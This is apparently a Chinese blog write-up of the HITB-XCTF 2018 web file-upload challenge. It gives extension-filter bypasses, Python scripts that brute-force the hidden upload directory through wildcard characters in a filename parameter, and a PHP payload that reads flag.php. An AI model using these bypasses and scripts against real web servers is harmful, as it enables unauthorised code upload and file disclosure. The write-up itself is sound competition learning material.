---
layout: post
title: HITB-XCTF 2018 Web upload writeup
author: Qiqi
date: 2018-4-27
header-img: img/-l35KO8ORiE.jpg
catalog: true
tag:
   - Web安全
   - CTF
   - Writeup
---

# HITB-XCTF 2018 Web upload writeup

只想说自己也是菜到一定境界了，啥也不会，全靠师傅们带飞，没有师傅们的思路，这题我肯定是无法当场复现了

这是一道文件上传

如果上传`.php`的文件，就会返回`no no no…`

如果上传`.jpg`的文件，就能成功上传并返回文件名，例如`1523666237.jpg`

右键查看源代码，发现了一行注释`<!--pic.php?filename=default.jpg-->`

于是我们去访问`47.90.97.18:9999/pic.php?filename=default.jpg`

返回了图片的宽和高，访问我们自己上传的图片也一样

现在我们要上传一个php文件

这里我们有很多种绕过方式，比如`1.php+空格`，或者`1.php::$DATA`都可以成功上传php文件

抓包修改文件名，成功上传php文件`1523668693.php `

现在我们访问`47.90.97.18:9999/pic.php?filename=1523668693.php `

页面返回`image error`

看来这个页面并不能读取到我们上传的php文件

不管能否解析，我们都先得找到文件上传的目录

尝试利用通配符

![](https://ws1.sinaimg.cn/large/006Vib6xly1fqbxv860wsj30ib03974v.jpg)

成功了，说明可以爆破

经过进一步尝试，感觉像是串md5

于是改进代码如下：

```python
import requests

url = "http://47.90.97.18:9999/pic.php?filename=../{}%3C/1523452862.jpg"
strs = "abcdef0123456789"
get = ""
for j in xrange(32):
    for i in strs:
        tmpurl = url.format(get + i)
        print tmpurl
        if 'image error' not in requests.get(tmpurl).content:
            get += i
            print '[+]' + get
            break
```

运行一下得到目录：`87194f13726af7cee27ba2cfe97b60df`

我们现在去访问`http://47.90.97.18:9999/87194f13726af7cee27ba2cfe97b60df/1523668693.php`

![](https://ws1.sinaimg.cn/large/006Vib6xly1fqby3u7hc1j30z90iidjp.jpg)

发现我们上传的php文件代码被成功解析（撒花～～）

我们去看一下`disable_functions`栏

```
assert,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
```

这么多函数都被禁了，但是我们发现`echo`没有被禁

尝试了各种方法来命令执行，可是都不成立

所以还是拿去扫了一下目录，看到`flag.php`

然后我们用`show_source()`或者`highlight_file()`函数查看一下源代码

Payload:

```php
<?php
echo show_source('../flag.php');
?>
```

访问上传的文件，获得flag

附上看wp时看到的别人写的一个脚本

```python
import requests
import string
sess = requests.session()

name = ''
while True:
    print(name)
    for i in string.digits + string.ascii_letters:
        guess = name + str(i)
        if 'image error' not in sess.get('http://47.90.97.18:9999/pic.php?filename=../' + guess + '%3C/1523462240.jpg').text:
            name += str(i)
            break
```

> 参考：`http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf`
>
> `>`会被替换成`?`，也就是单一字元，`<`会被替换成`*`，也就是任意长度字元，`"`会被替换成`a.`
